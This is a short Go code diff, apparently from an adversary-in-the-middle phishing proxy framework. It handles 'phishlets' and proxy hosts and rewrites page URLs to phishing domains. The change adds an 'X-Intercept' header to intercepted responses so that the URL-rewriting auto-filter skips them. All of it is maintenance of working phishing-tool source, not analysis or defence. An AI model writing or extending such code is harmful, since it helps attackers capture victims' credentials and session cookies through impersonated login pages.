@@ -1313,11 +1313,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				for site, pl := range p.cfg.phishlets {
 					if p.cfg.IsSiteEnabled(site) {
 						// handle auto filters
-						if stringExists(mime, p.auto_filter_mimes) {
-							for _, ph := range pl.proxyHosts {
-								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
-									if ph.auto_filter {
-										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
+						is_intercept := resp.Header.Get("X-Intercept")
+						if is_intercept == "" {
+							if stringExists(mime, p.auto_filter_mimes) {
+								for _, ph := range pl.proxyHosts {
+									if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
+										if ph.auto_filter {
+											body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
+										}
 									}
 								}
 							}
@@ -1555,6 +1558,7 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 		if origin != "" {
 			resp.Header.Set("Access-Control-Allow-Origin", origin)
 		}
+		resp.Header.Set("X-Intercept","1")
 		return req, resp
 	}
 	return req, nil
